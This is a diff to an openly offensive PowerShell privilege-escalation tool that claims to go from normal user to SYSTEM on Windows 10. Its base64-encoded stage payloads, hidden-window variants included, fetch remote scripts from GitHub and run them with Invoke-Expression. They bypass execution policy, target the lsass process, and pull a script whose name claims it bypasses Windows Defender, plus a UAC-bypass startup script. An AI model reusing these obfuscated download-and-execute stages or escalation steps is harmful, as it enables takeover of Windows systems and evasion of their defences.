@@ -13,7 +13,7 @@ This script itself is also "Clean"
 THIS SCRIPT ONLY SUPPORT WINDOWS 10!!!
 Can go up to SYSTEM from normal user
 Author: GetRektBoy724
-Version : v1.0.0
+Version : v1.0.1
 Required Dependencies: None  
 Optional Dependencies: None  
 .DESCRIPTION
@@ -50,16 +50,18 @@ Param(
 )
 #good tool needs a good banner
 $banner = @"
-██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
-██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
-██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
-██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
-██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
-╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
-------------------------------------------------------------------------------------------------
-                 [----Your All-In-One Powershell Privilege Escalation Tool----]                                       
-                 [--------------Built With Love By GetRektBoy724--------------]
-                 [--------------https://github.com/GetRektBoy724--------------]
+'########:::'#######::'##:::::'##:'########:'########::'########::'########::'####:'##::::'##:'########::'######:::'######::
+ ##.... ##:'##.... ##: ##:'##: ##: ##.....:: ##.... ##: ##.... ##: ##.... ##:. ##:: ##:::: ##: ##.....::'##... ##:'##... ##:
+ ##:::: ##: ##:::: ##: ##: ##: ##: ##::::::: ##:::: ##: ##:::: ##: ##:::: ##:: ##:: ##:::: ##: ##::::::: ##:::..:: ##:::..::
+ ########:: ##:::: ##: ##: ##: ##: ######::: ########:: ########:: ########::: ##:: ##:::: ##: ######:::. ######:: ##:::::::
+ ##.....::: ##:::: ##: ##: ##: ##: ##...:::: ##.. ##::: ##.....::: ##.. ##:::: ##::. ##:: ##:: ##...:::::..... ##: ##:::::::
+ ##:::::::: ##:::: ##: ##: ##: ##: ##::::::: ##::. ##:: ##:::::::: ##::. ##::: ##:::. ## ##::: ##:::::::'##::: ##: ##::: ##:
+ ##::::::::. #######::. ###. ###:: ########: ##:::. ##: ##:::::::: ##:::. ##:'####:::. ###:::: ########:. ######::. ######::
+..::::::::::.......::::...::...:::........::..:::::..::..:::::::::..:::::..::....:::::...:::::........:::......::::......:::
+----------------------------------------------------------------------------------------------------------------------------
+                               [----Your All-In-One Powershell Privilege Escalation Tool----]                                       
+                               [--------------Built With Love By GetRektBoy724--------------]
+                               [--------------https://github.com/GetRektBoy724--------------]
 "@
 Write-Host $banner
 #check windows build number
@@ -107,7 +109,7 @@ Start-Sleep 1
 function UserToSYSTEM {
 #craft the last stage and upload to paste.c-net.org
 if ($HideWindow) {
-$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
+$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7DQokYWNjZXNzcHNnZXRzeXMgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL3BzZ2V0c3lzLnBzMSAtVXNlQmFzaWNQYXJzaW5nOw0KSW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3BzZ2V0c3lzOw0KW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
 }else {
 $rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtZXAgYnlwYXNzIC1Ob0V4aXQgLUNvbW1hbmQgYCJgJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL09uZURvZXNOb3RTaW1wbHlCeXBhc3NFbnRpcmVXaW5EZWZlbmRlci5wczEgLVVzZUJhc2ljUGFyc2luZztJbnZva2UtRXhwcmVzc2lvbiBgJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdTY3JpcHRMaW5rJyk7YCIiKTs="    
 }
@@ -160,7 +162,11 @@ Invoke-Expression $firststage
 }
 function UserToAdmin {
 #craft the second stage and reverse it for obfuscation
+if ($HideWindow) {
 $rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
+} else {
+$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtZXAgYnlwYXNzIC1Db21tYW5kICIkYWNjZXNzc3RhcnR1cCA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvVUFDQlN0YXJ0dXAucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdzdGFnZTNsaW5rJyk7Ig=="
+}
 $rawsecondstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64secondstage"))
 $lastrawsecondstage = $rawsecondstage -replace "stage3link", "$ScriptLink"
 $secondstagebase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lastrawsecondstage))
@@ -201,7 +207,7 @@ Invoke-Expression $firststage
 function AdminToSYSTEM {
 #craft the last stage and upload to paste.c-net.org
 if ($HideWindow) {
-$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
+$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7DQokYWNjZXNzcHNnZXRzeXMgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL3BzZ2V0c3lzLnBzMSAtVXNlQmFzaWNQYXJzaW5nOw0KSW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3BzZ2V0c3lzOw0KW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
 }else {
 $rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtZXAgYnlwYXNzIC1Ob0V4aXQgLUNvbW1hbmQgYCJgJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL09uZURvZXNOb3RTaW1wbHlCeXBhc3NFbnRpcmVXaW5EZWZlbmRlci5wczEgLVVzZUJhc2ljUGFyc2luZztJbnZva2UtRXhwcmVzc2lvbiBgJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdTY3JpcHRMaW5rJyk7YCIiKTs="    
 }
